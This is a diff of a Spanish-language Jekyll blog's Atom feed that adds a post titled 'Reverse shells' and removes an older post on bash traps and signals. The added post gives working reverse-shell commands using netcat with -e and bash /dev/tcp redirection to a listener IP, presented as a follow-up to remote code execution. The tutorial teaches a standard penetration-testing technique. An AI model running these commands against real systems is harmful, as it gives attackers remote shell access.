@@ -1,4 +1,74 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2016-12-10T23:52:47+01:00</updated><id>http://localhost:4000//</id><title type="html">Out of memory</title><subtitle>Como si no tuviera otra cosa que hacer</subtitle><entry><title type="html">Have I been pwned?</title><link href="http://localhost:4000/pwned/" rel="alternate" type="text/html" title="Have I been pwned?" /><published>2016-12-09T00:00:00+01:00</published><updated>2016-12-09T00:00:00+01:00</updated><id>http://localhost:4000/pwned</id><content type="html" xml:base="http://localhost:4000/pwned/">&lt;p&gt;&lt;a href=&quot;https://troyhunt.com&quot;&gt;TroyHunt&lt;/a&gt;, experto en seguridad australiano, MVP de Microsoft en Developer Security, Microsoft Regional Director (y más cosas :P) puso en marcha una web &lt;a href=&quot;https://haveibeenpwned.com&quot;&gt;haveibeenpwned.com&lt;/a&gt; donde consultar si una cuenta online había sido comprometida (&lt;em&gt;pwned&lt;/em&gt;) en ciertos incidentes de seguridad, incluidos los famosos &lt;em&gt;hackeos&lt;/em&gt; de &lt;a href=&quot;http://www.theverge.com/2013/11/7/5078560/over-150-million-breached-records-from-adobe-hack-surface-online&quot;&gt;Adobe&lt;/a&gt;, &lt;a href=&quot;http://motherboard.vice.com/read/another-day-another-hack-117-million-linkedin-emails-and-password&quot;&gt;LinkedIn&lt;/a&gt;, etc.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2016-12-11T11:24:57+01:00</updated><id>http://localhost:4000//</id><title type="html">Out of memory</title><subtitle>Como si no tuviera otra cosa que hacer</subtitle><entry><title type="html">Reverse shells</title><link href="http://localhost:4000/reverse-shell/" rel="alternate" type="text/html" title="Reverse shells" /><published>2016-12-11T00:00:00+01:00</published><updated>2016-12-11T00:00:00+01:00</updated><id>http://localhost:4000/reverse-shell</id><content type="html" xml:base="http://localhost:4000/reverse-shell/">&lt;p&gt;Situación: encontrado un método de RCE pero sin posibilidad de acceso a la shell. Solución: &lt;em&gt;bind&lt;/em&gt; de la shell a un puerto TCP.&lt;/p&gt;
+
+&lt;h2 id=&quot;netcat&quot;&gt;netcat&lt;/h2&gt;
+
+&lt;p&gt;Esto ya lo vimos hace tiempo en este &lt;a href=&quot;/uso-de-netcat&quot;&gt;articulo&lt;/a&gt;. Lo que ocurre es que:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;nc/netcat no siempre estará disponible&lt;/li&gt;
+  &lt;li&gt;si lo está, es posible que no tenga la opción &lt;code class=&quot;highlighter-rouge&quot;&gt;-e&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;En ese caso, puedo ponerme a escuchar (en un puerto accesible al sistema de destino):&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -l 8080
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Y en destino:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc 192.168.56.1 8080 -e /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Ya podemos ejecutar comandos en el sistema remoto cómodamente sentados frente a nuestra máquina:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@mihost:~$ &lt;/span&gt;nc -l 8080
+hostname
+vmjessie
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;La máquina objeto de la ejecución de la shell inicia una conexión hacia el puerto de escucha (8080 en el ejemplo). Por eso es necesario elegir un puerto accesible, no filtrado; una elección segura serían los puertos 80 o 443.&lt;/p&gt;
+
+&lt;h2 id=&quot;bash&quot;&gt;bash&lt;/h2&gt;
+
+&lt;p&gt;En este caso no vamos a usar &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; en el equipo objetivo, sino un descriptor asociado a un socket donde vamos a enviar las salidas de la shell. Partimos de nuestro equipo (en el ejemplo, nuestra IP es 192.168.56.1), donde estamos escuchando (con &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; o lo que sea, da igual) en un puerto accesible:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -vvv -l 8080
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Y en el objetivo:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;5&amp;lt;&amp;gt;/dev/tcp/192.168.56.1/8080
+cat &amp;lt;&amp;amp;5 | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Con esto, los comandos que tecleemos en nuestra máquina son ejecutados en la remota y la salida nos llega a nosotros:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@192.168.56.1:~$ &lt;/span&gt;nc -vvv -l 8080  
+hostname
+target
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Mediante esta otra sintaxis:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@target:~$ &lt;/span&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/8080 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;tenemos igualmente la consola en nuestra máquina, prompt incluido:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@192.168.56.1:~$ &lt;/span&gt;nc -vvv -l 8080  
+&lt;span class=&quot;gp&quot;&gt;user@target:~$ &lt;/span&gt;hostname
+hostname
+target
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Si hay alguna razón para ejecutar la shell vía algún lenguaje de scripting (PHP, Perl, Python, Java, Ruby… ¡¡Gawk!!) &lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;aquí&lt;/a&gt; hay un montón de pruebas de concepto para entretenerse un rato.&lt;/p&gt;</content><summary type="html">Reverse shell cheat sheet</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/%7B%22feature%22=%3E%22pexels-photo-2.jpeg%22%7D" /></entry><entry><title type="html">Have I been pwned?</title><link href="http://localhost:4000/pwned/" rel="alternate" type="text/html" title="Have I been pwned?" /><published>2016-12-09T00:00:00+01:00</published><updated>2016-12-09T00:00:00+01:00</updated><id>http://localhost:4000/pwned</id><content type="html" xml:base="http://localhost:4000/pwned/">&lt;p&gt;&lt;a href=&quot;https://troyhunt.com&quot;&gt;TroyHunt&lt;/a&gt;, experto en seguridad australiano, MVP de Microsoft en Developer Security, Microsoft Regional Director (y más cosas :P) puso en marcha una web &lt;a href=&quot;https://haveibeenpwned.com&quot;&gt;haveibeenpwned.com&lt;/a&gt; donde consultar si una cuenta online había sido comprometida (&lt;em&gt;pwned&lt;/em&gt;) en ciertos incidentes de seguridad, incluidos los famosos &lt;em&gt;hackeos&lt;/em&gt; de &lt;a href=&quot;http://www.theverge.com/2013/11/7/5078560/over-150-million-breached-records-from-adobe-hack-surface-online&quot;&gt;Adobe&lt;/a&gt;, &lt;a href=&quot;http://motherboard.vice.com/read/another-day-another-hack-117-million-linkedin-emails-and-password&quot;&gt;LinkedIn&lt;/a&gt;, etc.&lt;/p&gt;
 
 &lt;p&gt;Puedes encontrar en &lt;a href=&quot;https://github.com/lmarqueta/pwned2&quot;&gt;GitHub&lt;/a&gt; un pequeño script para consultar la base de datos vía API. Ojo con los términos de &lt;a href=&quot;https://haveibeenpwned.com/API/v2#AcceptableUse&quot;&gt;uso aceptable&lt;/a&gt;&lt;/p&gt;</content><summary type="html">Script to check if an email address (or any email address in a file) has been pwned. Uses haveibeenpwned.com API v2</summary></entry><entry><title type="html">Migración a Jekyll</title><link href="http://localhost:4000/migracion-a-jekyll/" rel="alternate" type="text/html" title="Migración a Jekyll" /><published>2016-12-06T00:00:00+01:00</published><updated>2016-12-06T00:00:00+01:00</updated><id>http://localhost:4000/migracion-a-jekyll</id><content type="html" xml:base="http://localhost:4000/migracion-a-jekyll/">&lt;p&gt;Hace un tiempo migré la vieja web semiabandonada &lt;a href=&quot;http://marqueta.org&quot;&gt;marqueta.org&lt;/a&gt; a Jekyll alojado en &lt;a href=&quot;https://github.com&quot;&gt;GitHub&lt;/a&gt;. Mola, porque es como aquéllas primeras webs escritas en vi(m) con plantillas y expresiones regulares, pero a lo bestia :)&lt;/p&gt;
 
@@ -948,135 +1018,4 @@ Ya estoy contando hasta 10
 
 &lt;p&gt;De esta forma, en el momento en que el script falla aún no se han redefinido los traps y el fichero .lck no se borra.&lt;/p&gt;
 
-&lt;p&gt;Aun así, no estaría de más comprobar antes de borrar el fichero de lock que realmente ha sido escrito por mí (de ahí que se escriba el pid en el fichero). Pero bueno, eso ya es segundo de bash&lt;/p&gt;</content><summary type="html">segunda parte del artículo sobre señales en bash</summary></entry><entry><title type="html">Traps y señales en bash (I)</title><link href="http://localhost:4000/traps-y-senales-en-bash-i/" rel="alternate" type="text/html" title="Traps y señales en bash (I)" /><published>2013-11-21T00:00:00+01:00</published><updated>2013-11-21T00:00:00+01:00</updated><id>http://localhost:4000/traps-y-senales-en-bash-i</id><content type="html" xml:base="http://localhost:4000/traps-y-senales-en-bash-i/">&lt;p&gt;Algunos  problemas típicos a la hora de crear scripts en bash son estos:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Crear ficheros de lock para, por ejemplo, evitar la ejecución de más de una instancia del script&lt;/li&gt;
-  &lt;li&gt;Hacer limpieza de ficheros temporales si el script acaba inesperadamente&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Estos y muchos más que no se me ocurren ahora se pueden resolver gracias al &lt;em&gt;built-in&lt;/em&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;trap&lt;/code&gt;. Este comando permite capturar ciertas señales y definir la acción que se realiza cuando son recibidas por el programa.&lt;/p&gt;
-
-&lt;p&gt;Obviamente, hay ciertas señales que no se pueden redefinir como son:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 9) SIGKILL
-18) SIGCONT
-19) SIGSTOP
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;La lista se puede ver con el comando:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; -l
- 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGHUP   2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGINT   3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGQUIT  4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGILL   5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGTRAP
- 6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGABRT  7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGBUS   8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGFPE   9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGKILL 10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGUSR1
-11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGSEGV 12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGUSR2 13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGPIPE 14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGALRM 15&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGTERM
-16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGSTKFLT   17&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGCHLD 18&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGCONT 19&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGSTOP 20&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGTSTP
-21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGTTIN 22&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGTTOU 23&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGURG  24&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGXCPU 25&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGXFSZ
-26&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGVTALRM   27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGPROF 28&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGWINCH    29&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGIO   30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGPWR
-31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGSYS  34&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN    35&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+1  36&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+2  37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+3
-38&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+4  39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+5  40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+6  41&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+7  42&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+8
-43&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+9  44&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+10 45&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+11 46&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+12 47&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+13
-48&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+14 49&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMIN+15 50&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-14 51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-13 52&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-12
-53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-11 54&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-10 55&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-9  56&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-8  57&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-7
-58&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-6  59&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-5  60&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-4  61&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-3  62&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-2
-63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX-1  64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SIGRTMAX&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Algunas señales particularmente interesantes para los casos arriba indicados son SIGHUP, SIGINT, SIGQUIT y SIGTERM:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Señal&lt;/th&gt;
-      &lt;th&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;SIGHUP&lt;/td&gt;
-      &lt;td&gt;Históricamente era la señal que indicaba que el terminal al otro lado de la línea serie había “colgado”. Actualmente indica que el terminal controller se ha cerrado y suele redefinirse para recargar configuración y reabrir ficheros de log&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;SIGINT&lt;/td&gt;
-      &lt;td&gt;Interrupción, típicamente Ctrl+C en el teclado&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;SIGQUIT&lt;/td&gt;
-      &lt;td&gt;Enviado por el controlling terminal para terminar un programa (¿y generar un core dump?&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;SIGTERM&lt;/td&gt;
-      &lt;td&gt;Similar a SIGINT, indica la terminación de un programa&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Pues bien, estas señales se pueden capturar, redefinir o ignorar. Por ejemplo, podemos redefinir la acción que se ejecuta por defecto al recibir la señal que se genera al pulsar Ctrl+C  y decidir que, en lugar de terminar el programa, nos muestre un simpático mensaje:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;cat ctrlc.sh
-&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'echo &quot;Paso de ti...&quot;'&lt;/span&gt; SIGINT
-&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;do
- &lt;/span&gt;sleep 1
-&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Si lo ejecutamos y tratamos de interrumpir el programa con Ctrl+C…&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;chmod 755 ctrlc.sh
-&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;./ctrlc.sh
-^CPaso de ti...
-^CPaso de ti...
-^CPaso de ti...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Mmmm… ahora, claro, habrá que ingeniárselas para parar el programa de otra forma. Esto quiere decir que hay que ser cuidadoso redefiniendo señales.&lt;/p&gt;
-
-&lt;p&gt;El formato del comando trap es el siguiente:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'lista de comandos'&lt;/span&gt; SEÑAL1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SEÑAL2 ...]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Además, la señal se puede ignorar…&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; SIGNAL&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;o resetear a su valor por defecto (definido en signal.h):&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; - SIGNAL&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Con esto ya podemos ir haciendo cosas; si tenemos un script que genera ficheros temporales que queremos eliminar si termina de forma inesperada, podemos redefinir ciertas señales de este modo:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Borrar fichero temporal:&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/bin/rm /tmp/mitemp.$$; exit'&lt;/span&gt; SIGHUP SIGINT SIGQUIT SIGTERM&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Rizando, el rizo, se podría añadir la pseudoseñal ERR. Si ERR está en la lista de señales, la lista de comandos indicada definida en el trap se ejecutará si se produce un error (código de salida no-cero) en el script, salvo en estas circunstancias:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;El comando que ha fallado forma parte de una lista que sigue a &lt;code class=&quot;highlighter-rouge&quot;&gt;while&lt;/code&gt; o &lt;code class=&quot;highlighter-rouge&quot;&gt;until&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Es parte de un test en una sentencia &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Es parte de una lista de comandos &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;&amp;amp;&lt;/code&gt; o &lt;code class=&quot;highlighter-rouge&quot;&gt;||&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;La salida del comando está invertida via &lt;code class=&quot;highlighter-rouge&quot;&gt;!&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Así, por ejemplo:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;cat err.sh
-&lt;span class=&quot;c&quot;&gt;#!/bin/bash -e&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Defino el trap&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;trap&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'echo &quot;Se ha producido un error&quot;'&lt;/span&gt; ERR
-touch testfile.txt
-chmod 444 testfile.txt
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;esto va a fallar&quot;&lt;/span&gt; &amp;gt;testfile.txt
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;esto no se va a ejecutar&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Cuando se ejecuta ocurre esto:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;./err.sh
-./err.sh: line 7: testfile.txt: Permission denied
-Se ha producido un error&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Nótese que, al ejecutarse bash con la opción -e, termina tras el error y no llega a ejecutarse la última línea. Esto me recuerda que algún día habrá que escribir sobre los modificadores de bash, esos grandes desconocidos :)&lt;/p&gt;
-
-&lt;p&gt;Hay otra pseudoseñal interesante, EXIT, que se dispara cuando el script termina.&lt;/p&gt;
-
-&lt;p&gt;Y pensaba terminar con lo de los ficheros de lock, pero se quedará para una segunda parte.&lt;/p&gt;</content><summary type="html">Manejo básico de señales en la shell</summary></entry></feed>
+&lt;p&gt;Aun así, no estaría de más comprobar antes de borrar el fichero de lock que realmente ha sido escrito por mí (de ahí que se escriba el pid en el fichero). Pero bueno, eso ya es segundo de bash&lt;/p&gt;</content><summary type="html">segunda parte del artículo sobre señales en bash</summary></entry></feed>
